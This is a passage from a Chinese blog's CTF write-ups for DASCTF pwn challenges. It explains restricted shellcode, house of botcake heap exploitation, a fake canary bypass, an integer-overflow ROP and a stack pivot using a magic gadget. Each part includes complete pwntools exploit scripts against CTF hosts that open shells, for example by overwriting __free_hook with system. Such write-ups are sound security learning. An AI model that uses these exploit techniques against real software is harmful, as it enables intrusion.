0x0f05。</p><p>我们需要把这四个字节机器码给分成两批写入，因为0x5f5e需要异或两次做出来，而0x0f05需要异或一次做出来，如果放到一起的话第二次异或，除非我们布置一个0x0000和0x0f05异或，才可以保留0x0f05，否则0x0f05就会被改变。但是我们无法将0x0000输入进去，所以只能两批分开写入。</p><p>我们先将0x5f5e写入到内存里。</p><p>首先我们要考虑最初在0x10000上面写入0x4848(这个0x4848是啥都行，只要能通过检查，我只是最初随意找了个0x4848)。我们最后想让0x5f5e出现在内存里，那就需要去拿0x4848和0x5e5f(由于小端序)去异或一次，得到0x1617，而0x1617我们肯定是输入不进去的，所以还需要再异或一次得到0x1617。这次我找的是0x4141，因此那0x4141和0x1617异或，得到的结果是0x5756，然后发现0x5756可以输入进去。</p><p>因此思路为：先将0x4141写到内存，然后拿0x5756和这段内存异或，此时的内存值为0x1617。我们再拿0x4848和这段内存异或就得到了0x5e5f。</p><img src="../img/image-20221024213005259.png" alt="image-20221024213005259" style="zoom:50%;" /><img src="../img/image-20221024213207843.png" alt="image-20221024213207843" style="zoom:50%;" /><img src="../img/image-20221024213320203.png" alt="image-20221024213320203" style="zoom:50%;" /><p>然后如法炮制构造出来syscall指令。</p><p>因为构造pop rdi和pop rsi指令，就意味着在这之前我们需要压栈参数。观察此时的寄存器状态，我们需要给rsi 0x10000，需要给rdi 0。正好rbx和rcx寄存器满足这个条件，而且我们还能用push rbx push rcx。所以我们在0x10050-0x2的位置写下push rbx和push rcx的机器码。</p><p><img src="../img/image-20221024213552704.png" alt="image-20221024213552704"></p><p>最后执行系统调用read，把获取shell的shellcode给重新读入一次即可。</p><h3 id="EXP">EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1324)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor eax,0x31315756</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x31314848</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x3131444e</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x52],eax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send((asm(shellcode).ljust(<span class="number">0x50</span>-<span class="number">2</span>,<span class="string">b&#x27;\x58&#x27;</span>)+<span class="string">b&#x27;\x51\x53&#x27;</span>+<span class="string">b&#x27;\x41&#x27;</span>*<span class="number">4</span>).ljust(<span class="number">512</span>,<span class="string">b&#x27;\x58&#x27;</span>))</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Magic-Book">Magic_Book</h2><h3 id="house-of-botcake">house of botcake</h3><p>这道题利用的是house of botcake。第一次遇到这个手法，先简单记录一下该手法是如何利用的。</p><p>在2.29以后的glibc版本中加入了key机制，进入tcache bin的堆块会被添加一个key字段(也就是tcache_perthread_struct的地址)，位于chunk的bk位置。如果之后释放堆块准备进入tcache bin的时候，发现堆块的key字段位置已经是tcache_perthread_struct的地址，那就去遍历当前tcache bin，如果发现已经存在了当前堆块，那么就会报出 free(): double free detected in tcache 2的错误。</p><p>而house of botcake的思路是，先将堆块放入unsorted bin中(此处要利用UAF漏洞)，这样避免了key的位置是tcache_perthread_struct的地址。然后我们再次释放该堆块让其进入tcache bin，这样就绕过了检查。完成了double free，让同一个堆块即出现在了unsorted bin中又出现在了tcache bin中。</p><p>举个例子:</p><p>我们先申请七个堆块，准备一会将其释放，去填满tcache bin(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *p[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">p[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再申请两个0x100的堆块以及一个防止和top chunk合并的堆块(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">void</span> *victim=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>接着将最初的七个堆块全部释放，填满tcache bin(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们先去释放位于高地址的victim，它将进入unsorted bin，然后释放位于低地址的prev，它也会进入unsorted bin，而且将与victim合并成一个更大的位于unsorted bin的一个堆块(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>最后我们再申请出来一个0x100的堆块(因为tcache bin具有绝对的优先权，所以这个堆块会从tcache bin里取出来，而此时的tcache bin就只有6个堆块，空出来了一个)，然后我们将victim再释放掉，此时的victim进入tcache bin。这样我们只要从unsorted bin申请出来任意一个大小的堆块(能覆写到victim的fd指针并且大小不为0x100)，就可以打一个tcache poisoning。(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><h3 id="保护策略：-v3">保护策略：</h3><p><img src="../img/image-20221025213323159.png" alt="image-20221025213323159"></p><h3 id="程序逻辑：">程序逻辑：</h3><p>程序没有edit函数和show函数，然后有只能用一次的UAF漏洞。对申请的字节数还有限制，最大为0x100。</p><h3 id="利用思路：-v3">利用思路：</h3><p>这题如果单纯的打house of botcake，那么后续只能打io leak泄露一个堆地址。如果想第二次打tcache poisoning的话，就必须要进行一点布局。</p><p>我们先看一下单纯的io leak用house of botcake是怎么布局的。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure><p>上面就是最简单的一个house of botcake的布局，但是需要注意的是在<code>add(0x100,'here')</code>这行执行的时候，情况如下:</p><p><img src="../img/image-20221026104029350.png" alt="image-20221026104029350"></p><p>可以看到，我们将要申请的tcache bin的堆块为0x110，而申请出来的时候，是可以控制unsorted bin的size，如果我们将unsorted bin的size改成一个更大的size(让unsorted bin里包含一个tcache bin中的堆块)，这样下次切割unsorted bin的时候，又能够控制里面被包含的那个tcache bin的堆块的fd指针，从而达到第二次的tcache poisoning。</p><p>不过由于2.31的glibc版本中，对unsorted bin的检查较为严格，我们还需要伪造一个size和prev_size来保证unsorted bin在篡改size后依然能通过检查。</p><p>最后需要注意的就是，在第一次tcache poisoning攻击后0x110的链已经无法进行第二次的tcache poisoning了，所以我们需要提前布置一条新的链，便于第二次的tcache poisoning。</p><h3 id="EXP-v2">EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#second tcache poisoning.after the first tcache poisoning,the 0x100 tcache chain will bad</span></span><br><span class="line">    <span class="comment">#so we need to prepare 0x80 tcache chain</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">14</span>+p64(<span class="number">0x180</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#size and prev_size of unsigned bin to be forged</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#take one from tcache bin</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#let the fd pointer of unsorted bin local tcache bin</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x180</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#tamper size of unsorted bin</span></span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#second tcache poisoning</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)+p64(free_hook)</span><br><span class="line">    add(<span class="number">0xb0</span>,payload)<span class="comment">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin </span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(sys_addr))  </span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;heap&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25633&quot;</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><img src="../img/image-20221026105053790.png" alt="image-20221026105053790"></p><p>最开始复现这题的时候，挺懵的。通过不断调试roderick师傅的exp，渐渐知道了这题的做法(其实是我太菜了，花了一天才弄懂)。不过最后也仅仅是知道了这题的做法和思路，但不明白这个布局是怎么做出来的，于是第二天早上把exp删了，自己重新写了一下这道题，按照自己的思考走了一遍，才彻底明白了为什么要这么布局。</p><p>其实这也说明了在堆的布局上，不能只知其然，更要知其所以然。</p><h3 id="参考文章：">参考文章：</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16822129.html">DASCTF X GFCTF 2022十月挑战赛 pwn wp - LynneHuan - 博客园 (cnblogs.com)</a></p><p><a href="https://forum.butian.net/share/1709">奇安信攻防社区-深入理解 House of Botcake 堆利用手法 (butian.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode编写 </tag>
            
            <tag> house of botcake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07赋能赛 pwn部分wp</title>
      <link href="/posts/e4b35f09.html"/>
      <url>/posts/e4b35f09.html</url>
      
        <content type="html"><![CDATA[<h1>MyCanary2</h1><h2 id="保护策略：">保护策略：</h2><p><img src="../img/image-20221007211754434.png" alt="image-20221007211754434"></p><h2 id="程序逻辑：">程序逻辑：</h2><p><img src="../img/image-20221007211805698.png" alt="image-20221007211805698"></p><p>可以选择1，进行输入，并且这里存在了大量的溢出。</p><p>选择2，则是将一个随机数打印出来(这道题其实就相当于人工构造了一个canary)，不过打印出来之后会重新存入一个新的随机数。</p><p>选择3就会退出while的无限循环。</p><p>最后main函数返回的时候有一个检查如下</p><p><img src="../img/image-20221007211843931.png" alt="image-20221007211843931"></p><p>如果v2不等于生成的随机数的话(也就是溢出时覆盖了v2)，程序就会exit。也就是说前面溢出控制的返回地址也没用了。同时v2是可以被read输入的数据覆盖的。</p><h2 id="利用思路：">利用思路：</h2><p>这道题的思路就是通过随机数的检查，因此要么修改v2，要么修改0x4040d0上的随机数。因为这道题不可能输入到0x4040d0上，所以只考虑怎么修改v2的值为随机数。</p><p>唯一的方法就是选择1进行溢出返回地址后，<strong>再执行一次2将随机数打印出来，同时新的随机数又写到了v2。</strong></p><p>最后选择3后成功通过了随机数的检查，然后控制程序执行流即可。</p><h2 id="EXP">EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27117</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">back_door=<span class="number">0x401577</span></span><br><span class="line">payload=(<span class="number">0x70</span>+<span class="number">8</span>)*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x401589</span>)+p64(back_door)</span><br><span class="line"><span class="comment">#debug(p,0x401525,0x4014A9)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me the code:\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007211858489.png" alt="image-20221007211858489"></p><h1>eyfor</h1><h2 id="保护策略">保护策略:</h2><p><img src="../img/image-20221007211615854.png" alt="image-20221007211615854"></p><h2 id="漏洞所在：">漏洞所在：</h2><p><img src="../img/image-20221007211628523.png" alt="image-20221007211628523"></p><p>在vul函数中，a1的类型为int，但是read输入的时候强转成了unsigned int。这就意味着输入-1的话，read的第三个参数将变成0xffffffff,由于没有canary保护，所以这里就嘎嘎溢出了。</p><h2 id="利用思路：-v2">利用思路：</h2><p>用strncpy把/bin/sh\x00复制到bss段上，由于存在后门函数，然后read溢出劫持执行流即可获取shell。</p><h2 id="EXP-v2">EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_plt_addr=e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400983</span> </span><br><span class="line">bss_addr=<span class="number">0x6010C0</span></span><br><span class="line">leave_ret=<span class="number">0x400914</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;go\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x4007E8)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x400807</span>)+p64(pop_rdi_addr)+p64(bss_addr)+p64(sys_plt_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007211651058.png" alt="image-20221007211651058">】</p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022_checkin</title>
      <link href="/posts/59b6daad.html"/>
      <url>/posts/59b6daad.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习和收获有：</p><p>1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。</p><p>2、利用magic gadget修改got表</p><p>3、这道题的核心考察的就是栈迁移以及payload布局。</p><p>4、取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为负，则加0x100000000取补码。</p><p>5、如果可以的话，迁移到bss段尽量迁移到地址高一点的地方。这次打远程的那个exp就是因为bss段迁移的太低了，因为是破坏了某些数据，导致最后执行system函数的时候卡住了。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220328113024633-1772975266.png" alt=""></p><h2 id="大致思路：">大致思路：</h2><p><img src="../img/2706180-20220328113036736-1992703946.png" alt=""></p><p>可以发现，这道题就一个输入函数，没有输出函数，不过这个read具有16字节的溢出。这个没什么好想的，直接就栈迁移了。</p><p>然后输出函数也没有，泄露栈基地址这种情况就排除了，那就只能迁移到bss段。</p><p>先考虑一点，溢出16个字节仅仅只能去迁移，我们似乎没有办法去bss段布置数据。不过观察了一下汇编代码，发现read函数的第二个参数是由rbp确定的。</p><p><img src="../img/2706180-20220328113048327-1891287888.png" alt=""></p><p>而我们可以利用溢出来控制rbp，因此就相当于可以控制read的输入的地方了，控制完rbp的话，只能在控制一个返回地址，既然控制rbp就已经相当于控制rsi了，那就返回0x4011BF再读一次（此时的read输入的地址已经是bss段了）。<strong>选取往bss段输入的内容，一定要把地址抬高，我最开始选择的是往0x404100这里写入数据再迁移，到了最后执行system的过程中给卡死了</strong></p><p>read结束之后，又到了leave;ret指令。<strong>leave指令就是mov rsp;rbp  pop rbp</strong>；</p><p>执行leave指令的时候，我们的rbp是什么？是我们要控制read函数的rsi来设定的rbp（它现在是bss段地址）</p><p>我还是用实际的数据来举例一下吧。假设我第一次控制rbp为（0x404600+0xa0），那rsi的值就是0x404600（因为buf为-0xa0）（即我们输入的数据是从0x404600处开始输入的）我们可以输入0xB0个数据，因此在0x404600+0xa0这个地方写入0x404600。</p><p>此时执行read结束后的leave指令是什么情况？（如下图）</p><p><img src="../img/2706180-20220328113100100-154096690.png" alt=""></p><p><img src="../img/2706180-20220328113111922-1348637698.png" alt=""></p><p><img src="../img/2706180-20220328113121870-416873327.png" alt=""></p><p><img src="../img/2706180-20220328113132111-1383092616.png" alt=""></p><p>总结一下上面的过程，<strong>原本read读入完我们的数据，<font color=#FF0000 >rbp指向的才是我们想跳转的地方（并非rbp本身）</font>而rbp本身距离我们想跳转的还有0xa0个字节，不过至少rbp就在bss段，执行了第一次leave之后，<font color=#FF0000 >rsp也就变成了rbp的值（同时由于pop rbp，此时的rbp又变成了rbp当初所指向的内容）</font>，此时已经迁移到bss段了（只不过我们还要再迁移到我们布置的数据那里）因此再来一次leave（这个是第二次read输入过去的），由于leave里的mov rsp,rbp，rsp再次被改变，最后完成了迁移（迁移到了我们布置在bss段里的数据）</strong></p><p>至此的话，大体框架就已经完成了。</p><p><strong>剩下的就是在bss段中布局payload了，本地的话非常简单，用magic gadget去将setvbuf函数地址修改为one_gadget地址，然后调用一下setvbuf就完事了。远程的话，roderick师傅给我说，因为动态库的原因，one_gadget用不了，因此只能把setvbuf改成puts函数，然后再劫持程序执行流，完成ret2libc。</strong></p><p>这里先简单说一下magic gadget吧，用ROPgadget --binary checkin --opcode 015dc3  去搜这个gadget的地址。015dc3是这个gadget的机器码（IDA里是看不见的，因为这个是机器码错位得到的）。</p><p>这个gadget长这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure><p>核心是在第一行的add上，我们可以利用ret2csu控制rbp和rbx，由此就可以用这个修改函数的got表。以这道题为例，我现在想将setvbuf的真实地址改成one_gadget地址，只需要将rbp-0x3d写成setvbuf的got地址，将ebx放成setvbuf和one_gadget二者在libc库中的偏移即可。再调用这个one_gadget，即可完成修改got表。</p><p>这个magic gadget威力还是很大的，关于magic_gadget详细解释，我写在了这篇博客上  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p><p>一句话概括本题思路，利用栈迁移到bss段，调试布置payload，利用magic gadget修改setvbuf got表为打印函数，最后ret2libc即可。</p><h2 id="exp">exp:</h2><p>这是打本地的，用的one_gadget。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404100</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(<span class="number">0x8905c</span>)<span class="comment">#这个0x8905c为setvbuf和one_gadget二者地址在libc库中的差值</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404100</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>比赛结束，远程的环境关闭了，不过roderick师傅远程打通了，我按照他这个思路写的，动态库换成比赛给的2.31，然后改成remote，远程也是ok的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27544)</span></span><br><span class="line">e=ELF(<span 